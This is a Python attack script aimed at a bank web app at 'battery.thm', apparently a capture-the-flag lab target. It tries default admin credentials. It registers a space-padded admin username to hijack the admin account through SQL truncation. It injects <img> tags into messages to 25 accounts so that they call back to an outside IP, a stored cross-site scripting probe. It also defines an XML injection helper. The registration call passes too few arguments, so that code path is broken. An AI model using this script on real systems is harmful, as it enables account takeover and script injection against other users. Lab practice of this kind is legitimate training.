import requests

def create_user(sess, username, password, bankname):
	r = sess.post(host + "/register.php", data={'uname': username, 'password': password, 'bank':bankname, 'btn': "Register+me!"})

def login(sess, username, password):
	r = sess.post(host + "/admin.php", data={'uname': username, 'password':password, 'btn':'Submit'})
	return 'Welcome User' in r.text

def get_dashboard(sess):
	r = sess.get(host + "/dashboard.php")
	return r.text.split("Welcome ")[-1].replace("<br><br><br>","\n")

def do_withdraw(sess, amount, password):
	r = sess.post(host + "/with.php", data={'amnt': amount, 'pswd': password, 'wth':'withdraw'})

def do_deposit(sess, amount, password):
	r = sess.post(host + "/depo.php", data={'amnt': amount, 'pswd': password, 'wth':'Deposit'})

def do_transfer(sess, amount, password, account_nb, bankname):
	r = sess.post(host + "/tra.php", data={'amnt': amount, 'pswd': password, 'acc': account_nb, 'tbnk' : bankname, 'wth':'Transfer'})

def send_message(sess, acc_id, message):
	r = sess.post(host+'/acc.php', data={'acno': acc_id, 'msg': message, 'btn': 'Send'})

	return r.text.split("</form>")[-1]


def send_cmd(sess, acc_id, cmd):
	xml = f'<?xml version="1.0" encoding="UTF-8"?><root><name>{acc_id}</name><search>{cmd}</search></root>'
	r = sess.post(host+'/forms.php', data=xml, headers = {'Content-Type': 'application/xml'})

	return r.text.split("</html>")[-1]
	


if __name__ == "__main__":
	host="http://battery.thm"
	admin_user = "admin@bank.a"
	password = "admin"
	bankname = "ABC"

	

	s = requests.Session()

	# Retrieve session id
	s.get(host + "/admin.php")

	# Try login as admin user
	if not login(s, admin_user, password):
		create_user(s, admin_user + " "* 10 + "pwned", password)

	print(get_dashboard(s))

	for i in range(25):
		assert login(s, admin_user, password), "Couldn't login"
		print(i)
		r = send_message(s, i, f'<img src="http://10.6.32.20:8000/hitFrom{i}" />')
		print(r)

	
	